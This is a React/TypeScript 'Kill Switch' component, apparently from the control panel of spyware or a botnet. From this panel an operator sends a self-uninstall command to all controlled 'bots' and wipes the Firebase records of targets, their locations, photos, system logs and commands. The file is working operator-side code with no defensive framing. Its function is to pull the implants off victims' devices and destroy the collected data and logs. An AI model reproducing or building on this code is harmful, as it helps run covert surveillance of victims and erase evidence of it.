/**
 * Kill Switch Component - Emergency Self-Uninstall & Data Wipe
 * 2-Step Verification for security
 */

'use client';

import React, { useState } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { AlertTriangle, ShieldAlert, X, Terminal, Trash2 } from 'lucide-react';
import { Card } from '@/components/ui/Card';
import { Button } from '@/components/ui/Button';
import { Device } from '@/types';
import { ref, remove } from 'firebase/database';
import { database, FIREBASE_PATHS } from '@/lib/firebase';
import { useKillSwitch } from '@/hooks/useFirebase';
import { toast } from '@/lib/toast';

interface KillSwitchProps {
  devices: Device[];
}

export function KillSwitch({ devices }: KillSwitchProps) {
  const [step, setStep] = useState<0 | 1 | 2>(0);
  const [confirmText, setConfirmText] = useState('');
  const [isExecuting, setIsExecuting] = useState(false);
  const { mutate: sendKillCommand } = useKillSwitch();

  const handleFullWipe = async () => {
    if (confirmText !== 'ERASE_ALL_DATA') {
      toast.error('Konfirmasi teks salah');
      return;
    }

    setIsExecuting(true);
    try {
      const deviceIds = devices.map(d => d.id);
      sendKillCommand(deviceIds);

      await Promise.all([
        remove(ref(database, FIREBASE_PATHS.ACTIVE_TARGETS)),
        remove(ref(database, FIREBASE_PATHS.LOCATIONS)),
        remove(ref(database, FIREBASE_PATHS.SYSTEM_LOGS)),
        remove(ref(database, FIREBASE_PATHS.COMMANDS)),
        remove(ref(database, 'kei-vault/photos_list'))
      ]);

      toast.success('System Wipe Successful. All data erased.');
      window.location.reload();
    } catch (error) {
      toast.error('Wipe failed: ' + error);
    } finally {
      setIsExecuting(false);
      setStep(0);
    }
  };

  return (
    <>
      {/* ── Compact Kill Switch Button ── */}
      <button
        onClick={() => setStep(1)}
        className="inline-flex items-center gap-2.5 px-5 py-2.5 rounded-xl bg-red-500/[0.08] border border-red-500/20 text-red-400 text-xs font-semibold hover:bg-red-500/[0.12] hover:border-red-500/30 transition-all active:scale-[0.98]"
      >
        <ShieldAlert size={16} />
        <span>Kill Switch</span>
        <span className="text-[10px] text-red-500/50 font-mono ml-1">{devices.length} nodes</span>
      </button>

      {/* ── Modal ── */}
      <AnimatePresence>
        {step > 0 && (
          <div className="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-black/90 backdrop-blur-xl">
            <motion.div
              initial={{ scale: 0.95, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.95, opacity: 0 }}
              transition={{ duration: 0.2 }}
              className="max-w-md w-full"
            >
              <div className="bg-slate-900/95 border border-red-500/20 rounded-2xl p-6 shadow-2xl shadow-red-500/5">
                <div className="flex justify-between items-start mb-5">
                  <div className="w-11 h-11 rounded-xl bg-red-500/10 flex items-center justify-center text-red-500">
                    <AlertTriangle size={22} />
                  </div>
                  <button onClick={() => { setStep(0); setConfirmText(''); }} className="text-slate-500 hover:text-white transition-colors p-1">
                    <X size={20} />
                  </button>
                </div>

                {step === 1 ? (
                  <div className="space-y-5">
                    <div>
                      <h2 className="text-xl font-bold text-white mb-2">Kill Switch Protocol</h2>
                      <p className="text-sm text-slate-400 leading-relaxed">
                        This will send self-uninstall to all bots and permanently wipe all Firebase data.
                      </p>
                    </div>
                    <div className="p-3 rounded-xl bg-red-500/[0.06] border border-red-500/10">
                      <p className="text-xs text-red-400/80">
                        ⚠ {devices.length} active node{devices.length !== 1 ? 's' : ''} will be destroyed
                      </p>
                    </div>
                    <button
                      className="w-full py-3 bg-red-600 hover:bg-red-500 text-white rounded-xl font-semibold text-sm transition-colors"
                      onClick={() => setStep(2)}
                    >
                      I Understand, Continue
                    </button>
                  </div>
                ) : (
                  <div className="space-y-5">
                    <div>
                      <h2 className="text-xl font-bold text-red-500 mb-2">Final Verification</h2>
                      <p className="text-sm text-slate-400 mb-4">
                        Type <code className="text-white bg-white/[0.06] px-1.5 py-0.5 rounded text-xs font-mono">ERASE_ALL_DATA</code> to confirm.
                      </p>
                      <div className="relative">
                         <Terminal className="absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-500" size={16} />
                         <input
                           type="text"
                           className="w-full bg-black/40 border border-white/[0.08] rounded-xl py-3 pl-11 pr-4 text-white font-mono text-sm focus:border-red-500/50 outline-none transition-colors"
                           placeholder="Type here..."
                           value={confirmText}
                           onChange={(e) => setConfirmText(e.target.value)}
                           autoFocus
                         />
                      </div>
                    </div>
                    <div className="flex gap-3">
                      <button 
                        className="flex-1 py-3 border border-white/[0.08] text-slate-400 rounded-xl text-sm font-medium hover:bg-white/[0.03] transition-colors" 
                        onClick={() => { setStep(0); setConfirmText(''); }}
                      >
                        Cancel
                      </button>
                      <button
                        className="flex-1 py-3 bg-red-600 hover:bg-red-700 text-white rounded-xl text-sm font-semibold transition-colors disabled:opacity-40 disabled:cursor-not-allowed"
                        disabled={confirmText !== 'ERASE_ALL_DATA' || isExecuting}
                        onClick={handleFullWipe}
                      >
                        {isExecuting ? 'Wiping...' : 'Execute Wipe'}
                      </button>
                    </div>
                  </div>
                )}
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>
    </>
  );
}
